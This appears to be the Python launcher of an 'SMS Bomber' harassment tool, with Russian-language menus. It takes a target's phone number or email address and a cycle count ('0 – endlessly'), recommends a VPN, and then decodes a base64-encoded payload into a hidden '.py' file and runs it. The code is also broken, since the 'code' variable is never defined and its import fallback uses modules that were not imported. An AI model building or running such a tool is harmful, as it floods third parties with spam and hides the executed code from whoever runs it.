try:
    from colorama.ansi import Fore
    import os, time
    import base64

except ModuleNotFoundError:
    print(Fore.GREEN + '\nУстановка недостающих модулей..' + Fore.RESET + '\n\n')
    time.sleep(2)
    os.system('pip install colorama')
    os.system('pip install requests')
    os.system('clear')
    os.system('python start.py')

os.system('clear')
q = ' ___  __  __  ___    ___              _'
w = '/ __||  \/  |/ __|  | _ ) ___  _ __  | |__  ___  _ _'
e = "\__ \| |\/| |\__ \  | _ \/ _ \| '  \ | '_ \/ -_)| '_|"
r = '|___/|_|  |_||___/  |___/\___/|_|_|_||_.__/\___||_| '
t = '      https://github.com/mestr228/SmsBomber.git'
y = '                https://t.me/mestr228          '

def incorrectOption():
    print(Fore.CYAN + ' Неверный номер опции')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

def incorrectPhone():
    print(Fore.CYAN + ' Неверный номер')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

def incorrectEmail():
    print(Fore.CYAN + ' Неверная почта')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

#print(Fore.LIGHTRED_EX + 'hello' + Fore.LIGHTBLACK_EX + 'hello' + Fore.LIGHTBLUE_EX + 'hello' + Fore.LIGHTCYAN_EX + 'hello' + Fore.LIGHTGREEN_EX + 'hello' + Fore.LIGHTMAGENTA_EX + 'hello' + Fore.LIGHTWHITE_EX + 'hello' + Fore.LIGHTYELLOW_EX + 'hello')
#print(Fore.RED + 'hello' + Fore.BLACK + 'hello' + Fore.BLUE + 'hello' + Fore.CYAN + 'hello' + Fore.GREEN + 'hello' + Fore.MAGENTA + 'hello' + Fore.WHITE + 'hello' + Fore.YELLOW + 'hello')

print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')

print(Fore.BLUE + ' [+] ' + ' Выберите опцию ' + ' [+]\n')
print(Fore.BLUE + ' [0]' + Fore.CYAN + ' Закрыть программу')
print(Fore.BLUE + ' [1]' + Fore.CYAN + ' Спам телефона')
print(Fore.BLUE + ' [2]' + Fore.CYAN + ' Спам почты')

try:
    type = int(input(Fore.BLUE + '\n [Опция]: ' + Fore.CYAN))
except:
    incorrectOption()

if type == 0:
    print(Fore.CYAN + ' Буду ждать тебя!')
    exit()

elif type == 1:
    os.system('clear')
    print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')
    print(Fore.BLUE + ' [+]' + ' Спам телефона (Рекомендую использовать VPN)' + ' [+]\n')
    try:
        phone = int(input(Fore.BLUE + ' [79123456789]: ' + Fore.CYAN))
    except:
        incorrectPhone()

    if len(str(phone)) != 11:
        incorrectPhone()

    else:
        try:
            count = int(input('\n' + Fore.BLUE + ' [Количество циклов, 0 - бесконечно]: ' + Fore.CYAN))
        except:
            print(Fore.CYAN + ' Неверное число')
            time.sleep(1)
            os.system('clear')
            os.system('python start.py')
        os.system('clear')
        try:
            os.system('rm .email')
        except:
            pass
        phoneNymber = open('.phone', 'w+')
        phoneNymber.write(str(phone))
        phoneNymber.close()
        cycleCount = open('.count', 'w+')
        cycleCount.write(str(count))
        cycleCount.close()
        start = open('.py', 'w+')
        start.write(base64.b64decode(code.decode()).decode('utf-8'))
        start.close()
        os.system('python .py')

elif type == 2:
    os.system('clear')
    print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')
    print(Fore.BLUE + ' [+]' + ' Спам почты (Рекомендую использовать VPN)' + ' [+]\n')
    try:
        email = str(input(Fore.BLUE + ' [example@mail.ru]: ' + Fore.CYAN))
    except:
        incorrectEmail()

    if email.find('@') == -1 or email.find('.') == -1:
        incorrectEmail()

    else:
        try:
            count = int(input('\n' + Fore.BLUE + ' [Количество циклов, 0 - бесконечно]: ' + Fore.CYAN))
        except:
            print(Fore.CYAN + ' Неверное число')
            time.sleep(1)
            os.system('clear')
            os.system('python start.py')
        os.system('clear')
        try:
            os.system('rm .phone')
        except:
            pass
        emailAddress = open('.email', 'w+')
        emailAddress.write(email)
        emailAddress.close()
        cycleCount = open('.count', 'w+')
        cycleCount.write(str(count))
        cycleCount.close()
        start = open('.py', 'w+')
        start.write(base64.b64decode(code.decode()).decode('utf-8'))
        start.close()
        os.system('python .py')

else:
    incorrectOption()
    


